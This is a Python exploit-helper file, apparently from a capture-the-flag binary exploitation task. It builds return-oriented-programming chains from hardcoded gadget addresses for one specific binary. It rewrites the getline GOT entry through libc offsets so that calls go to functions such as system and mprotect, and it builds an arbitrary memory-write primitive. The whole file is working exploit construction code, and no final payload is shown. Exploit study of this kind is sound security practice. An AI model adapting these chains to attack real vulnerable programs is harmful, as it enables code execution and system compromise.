import math
import random
import sys

def debug(*args, **kwargs):
    print(*args, **kwargs, file = sys.stderr)

def int2bytes(v):
    # equivalent to p64(), but works with negative numbers
    return int(v).to_bytes(8, "little", signed = True)

def set_rdi_chain(rdi_new):
    return int2bytes(0x4008b3) + int2bytes(rdi_new)
def set_rsi_chain(rsi_new):
    return int2bytes(0x4008b1) + int2bytes(rsi_new) + b"A" * 8
def set_rdx_chain(rdx_new):
    return int2bytes(0x400bc2) + int2bytes(0x80 + rdx_new) + int2bytes(0x400c38)

def do_align(chain):
    # used to align the stack before libc calls. 0x4005d2 is just a `ret`.
    align_gadget = int2bytes(0x4005d2)
    return chain + align_gadget if len(chain) % 16 != 8 else chain


def memcpy_chain(dst, src, n_bytes):
    # simple chain which sets up the argument regs and rets to the memcpy gadget
    gadget_call_memcpy = int2bytes(0x400620)
    return (set_rdi_chain(dst) + set_rsi_chain(src) +
            set_rdx_chain(n_bytes) + gadget_call_memcpy)

def add_rsi_edi_chain(dest, val):
    """
    a chain which sets up the edi and rsi registers before jumping to
    `add [rsi], edi`
    """
    if isinstance(val, bytes):
        val = int.from_bytes(val, "little")
    gadget_add_rsi_rdi = int2bytes(0x400cc5)
    return set_rdi_chain(val) + set_rsi_chain(dest) + gadget_add_rsi_rdi

def update_getline_plt_chain(cur_f, next_f):
    """
    a chain which can be used to update the getline plt entry. requires
    knowledge of what the entry currently points to, since the update is done
    using an offset relative to the current entry.
    """

    libc_map = { "mprotect": 0x1189a0, "getline": 0x62d80,
                 "system":   0x52290,  "exit":    0x46a40
               }
    offset = libc_map[cur_f] - libc_map[next_f]
    getline_libc_addr_p = 0x403040
    return (b"" if offset == 0
            else add_rsi_edi_chain(getline_libc_addr_p, -offset))


def call_libc_chain(cur_f, next_f, rdi = None, rsi = None, rdx = None,
                    rcx = None, r8 = None, r9 = None):
    """
    a chain used to call libc functions. the chain first updates the current plt
    entry for getline
    """

    getline_plt_addr = int2bytes(0x400640)

    set_args_chain = b""
    if rdi is not None: set_args_chain += set_rdi_chain(rdi)
    if rsi is not None: set_args_chain += set_rsi_chain(rsi)
    if rdx is not None: set_args_chain += set_rdx_chain(rdx)
    if not (rcx is None and r8 is None and r9 is None):
        raise ValueError("rcx, r8, and r9 not yet supported")

    update_plt_chain = update_getline_plt_chain(cur_f, next_f)
    return update_plt_chain + set_args_chain + getline_plt_addr


def arbitrary_write_chain(addr, s, do_shuffle = True):
    """
    a chain that can be used to write arbitrary strings to memory, without the
    need to go byte hunting in the disassembly first. :D

    in general this also saves a very great number of space in the ROP-chain,
    since we use "only" 6 quadwords for each 4 bytes written, whereas the memcpy
    chain method uses 9 quadwords for every memcpy call, and the majority of
    memcpys write only 1 or 2 bytes at a time when we are limited to byte
    sequences found in the binary.

    technically, it does not write *arbitrary* strings, since the string cannot
    contain newline bytes. TODO: insert NULL bytes where we want newlines, and
    then use `add [rsi], edi` to add 10 to each of these.
    """
    if isinstance(s, str):
        s = bytes(s, encoding = "ascii")
    if not isinstance(s, bytes):
        raise ValueError("Second argument must be str or bytes!")
    if s == b"": return s

    # round up to nearest multiple of 4 then pad the string with null bytes.
    n = int(math.ceil((len(s) + (s[-1] != 0)) / 4) * 4)
    s += (n - len(s)) * b"\x00"

    # record addresses of newlines bytes in the original write string before
    # replacing all newlines with 0x9.
    nl_addrs = [addr + i for i, c in enumerate(s) if c == 0xa]
    s = bytes([c - int(c == 0xa) for c in s])

    ## first, we zero out the memory at `addr`, 28 bytes at a time, such
    ## that we can use the `add [rsi], edi` gadget to write bytes freely.
    ## the address 0x4008e4 points to 28 zero-bytes in read-only mem
    ZEROS = 0x4008e4
    zero_init_chain = b"".join(memcpy_chain(addr + i*28, ZEROS, 28)
                               for i in range(n // 28))
    if (rem := n % 28):
        zero_init_chain += memcpy_chain(addr + (n//28)*28, ZEROS, rem)


    ## next, we build the chain for the actual writing of bytes
    stride = range(0, n, 4)
    # split string in groups of 4, extending each group to 8 bytes.
    write_vals = [s[i:i+4] + 4 * b"\x00" for i in stride]

    # build a write chain using the `add [rsi], edi` gadget for each group of
    # 4 bytes in the input string
    write_chains = [add_rsi_edi_chain(addr + i, write_val)
                    for i, write_val in zip(stride, write_vals)]

    # reconstruct newline bytes by incrementing bytes at the recorded addresses
    nl_recon_chain = b"".join(add_rsi_edi_chain(addr, 1) for addr in nl_addrs)

    if do_shuffle:
        random.shuffle(write_chains)
    write_chain = b"".join(write_chains)

    return zero_init_chain + write_chain + nl_recon_chain

GARBAGE_BYTES = 131 * b"\x00"

